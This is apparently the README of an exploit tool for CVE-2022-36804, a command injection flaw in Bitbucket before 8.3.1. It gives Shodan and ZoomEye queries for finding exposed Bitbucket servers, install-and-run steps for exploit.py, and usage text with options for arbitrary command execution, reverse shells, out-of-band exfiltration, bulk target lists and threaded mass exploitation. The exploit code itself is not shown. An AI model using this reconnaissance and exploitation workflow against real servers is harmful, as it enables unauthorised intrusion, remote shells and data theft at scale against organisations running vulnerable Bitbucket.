# CVE-2022-36804
BitBucket Critical Command Injection.

 - Shodan dork:
```
http.favicon.hash:667017222 http.title:Public
```
 - Zoomeye:
```
app:"Bitbucket" +banner:"repos?visibility=public"

app:"Bitbucket" +title:"public"

app:"Bitbucket"

iconhash:667017222

iconHash:667017222 +title=Public
```
 - Install:
 ```
python3 -m pip install -r requirements.txt
python3 exploit.py --server [target]
```

 - Usage
 ```
 usage: exploit.py [-h] [--server SERVER] [--project PROJECT] [--repo REPO] [--skip-auto]
               [--session SESSION] [--command CMD] [--file FILE] [--output OUTPUT]
               [--lhost LHOST] [--lport LPORT] [--threads THREADS]

Exploit BitBucket Instances (< v8.3.1) using CVE-2022-36804. Exploits automagically
without any extra parameters, but allows for custom settings as well.

options:
  -h, --help         show this help message and exit
  --server SERVER    Host to attack
  --project PROJECT  The name of the project the repository resides in
  --repo REPO        The name of the repository
  --skip-auto        Skip the automatic finding of exploitable repos
  --session SESSION  Value of 'BITBUCKETSESSIONID' cookie, useful if target repo is
                     private
  --command CMD      Command to execute if exploit is successful (Note: getting output
                     isn't reliable so OOB exfil is a must)
  --file FILE        File to scan bulk hosts
  --output OUTPUT    Output file for the session
  --lhost LHOST      Your Local Host for reverse shell
  --lport LPORT      Your Local Port for reverse shell
  --threads THREADS  Threads for mass exploitation
  ```

